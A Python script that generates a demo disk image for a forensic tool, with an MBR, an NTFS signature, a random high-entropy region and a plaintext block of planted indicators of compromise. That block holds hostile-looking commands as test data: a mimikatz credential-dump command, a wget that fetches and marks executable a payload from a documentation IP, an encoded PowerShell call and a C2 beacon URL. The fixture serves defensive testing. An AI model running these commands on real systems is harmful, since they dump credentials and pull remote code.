"""Builds the sample disk image we use to demo the forensic tool.

We needed a small, predictable .dd file that would actually trigger every finding
the app can produce — a valid MBR so the parser has something to chew on, an NTFS
signature so the FS sniffer fires, a chunk of high-entropy data so both the
adaptive entropy detector and the Isolation Forest light up, and some strings
embedded in plaintext so the IOC miner and the malware-keyword scanner have
something to find.

Run it once:

    python make_demo_image.py

Then drag the resulting sample_evidence.dd onto the app's drop zone.

Worth knowing: the high-entropy region is filled with os.urandom() each time
this is run, so the file's hash changes on every regeneration. That's fine —
the app's chain-of-custody check uses the pre-analysis and post-analysis hashes
from a single session, so they always match for that run.
"""

import os
import struct

OUT = "sample_evidence.dd"
SIZE = 8 * 1024 * 1024  # 8 MB is enough to be realistic without making the demo slow

img = bytearray(SIZE)

# ----- Master Boot Record --------------------------------------------------
# Putting "NTFS    " at offset 3 — the app's MBR parser checks that exact spot
# to identify the file system. Eight bytes, space-padded.
img[3:11] = b"NTFS    "

# Disk signature lives at bytes 440 to 443. Easy to spot in the output too.
img[440:444] = b"\xDE\xAD\xBE\xEF"

# One primary partition entry at offset 446. 16 bytes: status, CHS start (we
# don't bother with CHS, the app reads LBA), partition type, CHS end, start
# LBA, size in sectors.
part = bytearray(16)
part[0] = 0x80                                          # 0x80 = bootable
part[4] = 0x07                                          # 0x07 = NTFS / exFAT
struct.pack_into("<I", part, 8,  2048)                  # start at LBA 2048
struct.pack_into("<I", part, 12, (SIZE // 512) - 2048)  # fill the rest of the disk
img[446:462] = part

# 0x55 0xAA at the very end of the sector — the magic bytes that say
# "yes, this really is an MBR".
img[510] = 0x55
img[511] = 0xAA

# ----- Plaintext region with IOCs and malware keywords ---------------------
# We drop this near the start of the image so the string extractor (which only
# scans the first 10 MB) is guaranteed to see it. The content mixes things the
# tool should flag (IOCs, malware tool names, suspicious shell commands) with
# enough chatter to feel realistic.
text = (
    "User logged in. Routine activity.\n"
    "C:\\Users\\suspect\\Downloads\\invoice.pdf opened\n"
    "powershell -enc SQBFAFgAKAAuLi4p   # encoded command\n"
    "mimikatz # sekurlsa::logonpasswords\n"
    "Beacon to http://malicious-c2.example.com/gate.php\n"
    "Callback IP 203.0.113.66 over 443\n"
    "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run added\n"
    "cmd.exe /c whoami & net user\n"
    "lateral move via \\\\FILESRV01\\IPC$ share\n"
    "stage data in /var/tmp/.cache/exfil.bin\n"
    "wget http://198.51.100.23/payload.sh; chmod +x payload.sh\n"
) * 50
encoded = text.encode()
img[600 : 600 + len(encoded)] = encoded

# ----- High-entropy "encrypted" region -------------------------------------
# 2 MB of cryptographic randomness, sitting in the middle of the disk. This
# is the bit the AI is meant to spot: every sector in this range saturates
# near 8 bits/byte of Shannon entropy, which is way above the disk's overall
# baseline (most of the disk is still zero-padded).
enc_start = 3 * 1024 * 1024
enc = os.urandom(2 * 1024 * 1024)
img[enc_start : enc_start + len(enc)] = enc

with open(OUT, "wb") as f:
    f.write(img)

print(
    f"Wrote {OUT} ({SIZE // 1024 // 1024} MB): valid MBR, NTFS, 1 partition, "
    f"2 MB high-entropy region, malware keywords + IOCs."
)
